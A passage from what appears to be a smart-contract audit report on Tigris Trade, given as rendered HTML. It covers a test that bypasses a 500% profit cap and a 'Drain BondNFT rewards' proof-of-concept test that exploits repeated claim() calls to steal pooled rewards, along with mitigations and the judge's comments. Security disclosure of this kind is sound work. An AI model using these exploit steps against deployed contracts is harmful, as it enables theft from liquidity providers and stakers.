parseEther(&quot;990&quot;).add(extraMargin.mul(990).div(1000));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let originalProfit = parseEther(&quot;3960&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let extraProfit = balanceAfter.sub(balanceBefore).sub(marginAfterFee).sub(originalProfit);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(extraProfit.gt(parseEther(&#39;2600&#39;))).to.be.true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">});</span></span></code></pre>\n<p>The test result</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"> Design Specification: Maximum PnL is +500%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Bypass the maximum PnL check to take extra profit</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      √ All profit is $9900, close the order normally, only get $3960 profit</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      √ All profit is $9900, bypass the PnL check to take extra $2600 profit</span></span></code></pre>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add a check for <code>addToPosition()</code> function, revert if PnL >= 500%, enforce users to close the order to take a limited profit.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/111#issuecomment-1364943872\">TriHaz (Tigris Trade) confirmed, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>It is valid but I think it should be Medium risk as it needs +500% win to happen so assets are not in a direct risk, need a judge opinion on this.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/111#issuecomment-1378270756\">KingNFT (warden) commented</a>:</strong></p>\n<blockquote>\n<p>As the max leverages are 100x for crypto pairs and 500x for forex pairs, so 5% price change on crypto pairs or 1% on forex pairs lead to 500% profit. I think it would be frequent to see +500% win happening.</p>\n<p>In my personal opinion, the <code>500%</code> security design is a base and important feature to protect fund safety of stakers, this bug causes the feature almost not working. Maybe it deserves a high severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/111#issuecomment-1383720303\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, because of a lack of checks, an attacker could bypass the PNL cap and extract more value than intended.</p>\n<p>While the condition of having a price movement of 500% can be viewed as external, I believe that in this specific case we have to exercise more nuance.</p>\n<p>An attacker could setup a contract to perform the sidestep only when favourable, meaning that while the condition may not always be met, due to volatility of pricing there always is a % (can be viewed as a poisson distribution) that a PNL bypass would favour the attacker.</p>\n<p>Additionally, after the <a href=\"https://chaindebrief.com/how-manipulation-on-aave-and-curve-went-wrong-attacker-got-rekted-instead/\">CRV / AVI attack</a> we have pretty strong evidence that any +EV scenario can be exploited as long as the payout is high enough.</p>\n<p>As such I believe that the finding doesn’t truly rely on an external condition.</p>\n<p>For this reason, as well as knowing that the value extracted will be paid by LPs / the Protocol, I believe High Severity to be the most appropriate</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/111#issuecomment-1407134511\">GainsGoblin (Tigris Trade) commented</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173887\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173887</a> </p>\n<p>Implemented something similar to this report’s recommended mitigation, where if PnL is >= maxPnl%-100%, then addToPosition, addMargin and removeMargin revert.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-05-malicious-user-can-steal-all-assets-in-bondnft\" style=\"position:relative;\"><a href=\"#h-05-malicious-user-can-steal-all-assets-in-bondnft\" aria-label=\"h 05 malicious user can steal all assets in bondnft permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/170\">[H-05] Malicious user can steal all assets in BondNFT</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/170\">hihen</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/503\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/423\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/398\">__141345__</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/182\">rvierdiiev</a>, and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/68\">HollaDieWaldfee</a></em></p>\n<p>Malicious user can drain all assets in BondNFT, and other users will lose their rewards.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When calling <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187\">BondNFT.claim()</a> for an expired bond, it will recalculate <code>accRewardsPerShare</code>. This is because the reward after the <code>expireEpoch</code> does not belong to that expired bond and needs to be redistributed to all other bonds.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expired</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_pendingDelta</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">accRewardsPerShare</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">]] / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">bondPaid</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">][</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">]) - (</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">accRewardsPerShare</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expireEpoch</span><span class=\"mtk1\">-</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">bondPaid</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">][</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">] &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">accRewardsPerShare</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">]] += </span><span class=\"mtk12\">_pendingDelta</span><span class=\"mtk1\">*</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">/</span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>In the current implementation of <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187\">BondNFT.claim()</a>, it can be called repeatedly as long as the expired bond is not released.</p>\n<p>According to the formula in the above code, we can find that although each subsequent <code>claim()</code> of the expired bond will transfer 0 reward, the <code>accRewardsPerShare</code> will be updated cumulatively.\nThus, the pending rewards of all other users will increase every time the expired bond is <code>claim()</code>ed.</p>\n<p>A malicious user can exploit this vulnerability to steal all assets in BondNFT contract:</p>\n<ol>\n<li>Create two bonds (B1, B2) with different <code>expireEpoch</code></li>\n<li>At some time after B1 has expired (B2 has not), keep calling <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Lock.sol#L34\"><code>Lock.claim(B1)</code></a> to increase rewards of B2 continuously, until the pending rewards of B2 approaches the total amount of asset in the contract.</li>\n<li>Call <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Lock.sol#L34\"><code>Lock.claim(B2)</code></a> to claim all pending rewards of B2.</li>\n</ol>\n<p>An example of such an attack:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">diff</span><span class=\"mtk1\"> --</span><span class=\"mtk12\">git</span><span class=\"mtk1\"> </span><span class=\"mtk12\">a</span><span class=\"mtk1\">/</span><span class=\"mtk12\">test</span><span class=\"mtk1\">/09.</span><span class=\"mtk12\">Bonds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">js</span><span class=\"mtk1\"> </span><span class=\"mtk12\">b</span><span class=\"mtk1\">/</span><span class=\"mtk12\">test</span><span class=\"mtk1\">/09.</span><span class=\"mtk12\">Bonds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">index</span><span class=\"mtk1\"> 16</span><span class=\"mtk12\">c3ff5</span><span class=\"mtk1\">..7</span><span class=\"mtk12\">c445c3</span><span class=\"mtk1\"> </span><span class=\"mtk7\">100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">--- </span><span class=\"mtk12\">a</span><span class=\"mtk1\">/</span><span class=\"mtk12\">test</span><span class=\"mtk1\">/09.</span><span class=\"mtk12\">Bonds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+++ </span><span class=\"mtk12\">b</span><span class=\"mtk1\">/</span><span class=\"mtk12\">test</span><span class=\"mtk1\">/09.</span><span class=\"mtk12\">Bonds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -</span><span class=\"mtk7\">245</span><span class=\"mtk1\">,</span><span class=\"mtk7\">7</span><span class=\"mtk1\"> +</span><span class=\"mtk7\">245</span><span class=\"mtk1\">,</span><span class=\"mtk7\">90</span><span class=\"mtk1\"> @@ </span><span class=\"mtk11\">describe</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Bonds&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lock</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">release</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pending</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equals</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;999999999999999999725&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Negligable difference from 1000e18 due to solidity division</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    </span><span class=\"mtk12\">it</span><span class=\"mtk1\">.</span><span class=\"mtk11\">only</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Drain BondNFT rewards&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getState</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balHacker</span><span class=\"mtk1\">= </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hacker</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balLock</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lock</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balBond</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> [</span><span class=\"mtk12\">pending1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pending2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pending3</span><span class=\"mtk1\">] = [</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pending</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">), </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pending</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">), </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pending</span><span class=\"mtk1\">(</span><span class=\"mtk7\">3</span><span class=\"mtk1\">)];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">hacker:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balHacker</span><span class=\"mtk1\">, </span><span class=\"mtk12\">lock:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balLock</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bond:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balBond</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pending1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pending2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pending3</span><span class=\"mtk1\">};</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      };</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">v</span><span class=\"mtk1\">) </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk12\">v</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toString</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gwei</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1e9</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk3\">// prepare tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TotalRewards</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">8000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mintFor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">TotalRewards</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mintFor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hacker</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">rndAddress</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mintFor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hacker</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2000</span><span class=\"mtk1\">+</span><span class=\"mtk7\">700</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hacker</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Lock</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2000</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk3\">// bond1 - user</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lock</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">lock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">StableToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">), </span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk11\">distribute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">3800</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pending</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">closeTo</span><span class=\"mtk1\">(</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">3800</span><span class=\"mtk1\">), </span><span class=\"mtk12\">gwei</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk3\">// Skip some time</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_increaseTime&quot;</span><span class=\"mtk1\">, [</span><span class=\"mtk7\">20</span><span class=\"mtk1\">*</span><span class=\"mtk7\">86400</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span 